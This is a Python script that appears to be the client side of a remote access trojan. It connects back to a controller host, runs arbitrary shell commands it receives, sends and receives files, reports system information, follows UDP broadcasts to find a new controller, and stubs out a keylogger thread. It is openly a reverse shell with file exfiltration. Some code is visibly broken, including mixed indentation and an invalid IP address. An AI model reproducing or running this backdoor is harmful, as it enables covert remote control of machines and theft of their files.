#!/usr/bin/python3
import socket
import subprocess
import threading
import time
import os
import concurrent.futures
import platform


REMOTE_SERVER = "192.168.1.111"
PORT = 58752
SYSTEM_INFO = ""
REST_CONNECTION = False


def check_internet():
    print('testing internet...')
    for _ in range(3):
        try:
            host = '8.8.8.812'
            s = socket.create_connection((host, 53), 2)
            s.close()
            print('system has internet')
            return True
        except:
            pass
    print('system has no internet')
    return False


def collect_system_info():
	# OS
	# Version
	# [LINUX ONLY] Desktop environment
	# Hostname
	# Username
	# Users
	#
    return platform.platform()

def create_caption():
	# return username and computer name
	return platform.platform()

def exec_command(command):
    print('Executing:', command)
    result = ''
    try:
        result_bytes = subprocess.check_output(command, shell=True)
        result = result_bytes.decode('utf-8')
    except:
        result = 'Error executing command'
    # print('output:' , output)
    # for line in output:
        # result.append(line)
    print('result:', result)
    return "result: %s " % result


# def run_windows_cmd_or_linux_shell(command, params):
#     result = []
#     process = subprocess.call(command,
#                                shell=False,
#                                stdout=subprocess.PIPE,
#                                stderr=subprocess.PIPE)
#     for line in process.stdout:
#         result.append(line)
#     return result


def run_shell():
    while True:
        print('shell running...')
        try:
            s = socket.socket()
            s.settimeout(10)
            s.connect((REMOTE_SERVER, PORT))
            s.settimeout(None)
            print('connected to server.')
            global REST_CONNECTION
            REST_CONNECTION = False
            while True:
                if REST_CONNECTION:
                    print('Reseting Connection...')
                    s.close
                    REST_CONNECTION = False
                    break
                print('waiting for command')
                command_bytes = (s.recv(1024))
                command = command_bytes.decode("utf-8")

                print('Received: "', command, '"')
                if(command == ""):
                    break
                elif command == "__0":
                    s.close
                elif command == "sys_info":
                    output = collect_system_info()
                elif command == "__up":
                    get_file(s)
                elif command == "__down":
                    send_to_server(s)
                elif command == "apps":
                    # TODO # Display clients forground running applications
                    pass
                elif command == "kill":
                    # TODO # Get clients process by name and stop that process
                    pass
				elif command == "caption":
					output = create_caption()
                else:
                    output = exec_command(command)

                output_bytes = bytes(output, 'utf-8')
                try:
                    s.send(output_bytes)
                except (socket.error):
                    print('Error Sending bytes:', socket.error)
                    break
            s.close
        except (socket.error):
            print('Error somewhere else:', socket.error)
            s.close
            time.sleep(3)
        except (socket.gaierror):
            print('Error configuring address:', socket.error)
            pass
    print('shell running ended')


def get_file(s):
    s.send(bytes("OK", 'utf-8'))
    print('Waiting for File destination...')
    des = s.recv(512)
    s.send(bytes("OK", 'utf-8'))
    print('Waiting for File length...')
    bs = s.recv(16)
    s.send(bytes("OK", 'utf-8'))
    length = int(bs.decode('utf-8'))
    print('Length is {}. Waiting for File...'.format(bs))
    data = b''
    print('chunck is:', type(length))
    file = open(des, 'wb')
    while len(data) < length:
        to_read = length - len(data)
        data += s.recv(
            4096 if to_read > 4096 else to_read)
    file.write(data)
    print(str(file), "Received")
    file.close()


def send_to_server(server):
    server.send(bytes("OK", 'utf-8'))
    # Get source path
    print("sending to sever")
    src = server.recv(1024)
    print("decoding")
    src = src.decode('utf-8')
    print('Source:', src)
    length = -1

    print('checking file')
    if(not os.path.isfile(src)):
        print('File does not exist.')
        server.send(bytes(str(length), 'utf-8'))
        return
    # open file
    file_bytes = ''
    print('opening file')
    with open(src, 'rb') as file:
        print('reading file')
        file_bytes = file.read()
        length = len(file_bytes)

    print("Sending Length")
    server.send(bytes(str(length), 'utf-8'))
    server.recv(7)
    print("Sending File")
    server.send(file_bytes)
    print('File has been sent successfully.')


def run_keylogger():
    while True:
        print('keylogger is running...')
        time.sleep(60)


def listen_to_local_broadcast():
    while True:
        global REMOTE_SERVER
        global REST_CONNECTION
        new_remote_server = get_single_local_broadcast()
        if(new_remote_server != REMOTE_SERVER):
            REMOTE_SERVER = new_remote_server
            REST_CONNECTION = True
        time.sleep(2)


def get_single_local_broadcast():
    broadcast_host = ''
    broadcast_port = 10100
    print('Waiting for local server broadcast on port', broadcast_port)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.bind((broadcast_host, broadcast_port))
    message, address = s.recvfrom(10100)
    print("Got data from", address)
    print("Message is", message)
    return message.decode('utf-8')


if __name__ == '__main__':
    print('Running Client.py')
    SYSTEM_INFO = collect_system_info()
    # system_has_internet = check_internet()
    system_has_internet = True
    if system_has_internet:
        REMOTE_SERVER = '127.0.0.1'
    else:
        REMOTE_SERVER = get_single_local_broadcast()

    print('Remote Server IP set to:', REMOTE_SERVER)
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        executor.submit(run_shell)
        executor.submit(run_keylogger)
        executor.submit(listen_to_local_broadcast)
